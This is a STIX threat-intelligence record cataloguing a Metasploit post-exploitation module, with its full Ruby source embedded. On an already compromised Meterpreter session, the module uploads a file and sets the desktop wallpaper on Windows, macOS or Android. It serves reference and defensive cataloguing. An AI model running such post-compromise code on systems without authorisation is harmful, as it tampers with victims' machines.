{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--92e9fb88-1d5e-4b87-a446-333169b49e4c",
    "created": "2024-08-14T16:33:18.003742Z",
    "modified": "2024-08-14T16:33:18.003746Z",
    "name": "Multi Manage Set Wallpaper",
    "description": " This module will set the desktop wallpaper background on the specified session. The method of setting the wallpaper depends on the platform type.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/set_wallpaper.rb",
            "external_id": "set_wallpaper.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Manage Set Wallpaper',\n        'Description' => %q{\n          This module will set the desktop wallpaper background on the specified session.\n          The method of setting the wallpaper depends on the platform type.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'timwr'],\n        'Platform' => [ 'win', 'osx', 'linux', 'android' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              android_*\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptPath.new('WALLPAPER_FILE', [true, 'The local wallpaper file to set on the remote session'])\n      ]\n    )\n  end\n\n  def upload_wallpaper(tempdir, file)\n    remote_file = \"#{tempdir}#{File.basename(file)}\"\n    print_status(\"#{peer} - Uploading to #{remote_file}\")\n\n    write_file(remote_file, File.binread(file))\n    print_status(\"#{peer} - Uploaded to #{remote_file}\")\n    remote_file\n  end\n\n  #\n  # The OS X version uses an AppleScript to do this\n  #\n  def osx_set_wallpaper(file)\n    remote_file = upload_wallpaper('/tmp/', file)\n    script = %(osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"#{remote_file}\"')\n    begin\n      cmd_exec(script)\n    rescue EOFError\n      return false\n    end\n    true\n  end\n\n  #\n  # The Windows version uses the SystemParametersInfo call\n  #\n  def win_set_wallpaper(file)\n    remote_file = upload_wallpaper('%TEMP%\\\\', file)\n    client.railgun.user32.SystemParametersInfoA(0x0014, nil, remote_file, 0x2) != 0\n  end\n\n  #\n  # The Android version uses the set_wallpaper command\n  #\n  def android_set_wallpaper(file)\n    client.android.set_wallpaper(File.binread(file))\n    true\n  end\n\n  def os_set_wallpaper(file)\n    case session.platform\n    when 'osx'\n      osx_set_wallpaper(file)\n    when 'windows'\n      win_set_wallpaper(file)\n    when 'android'\n      android_set_wallpaper(file)\n    end\n  end\n\n  def run\n    file = datastore['WALLPAPER_FILE']\n    if os_set_wallpaper(file)\n      print_good(\"#{peer} - The wallpaper has been set\")\n    else\n      print_error(\"#{peer} - Unable to set the wallpaper\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win', 'osx', 'linux', 'android' ]"
    ]
}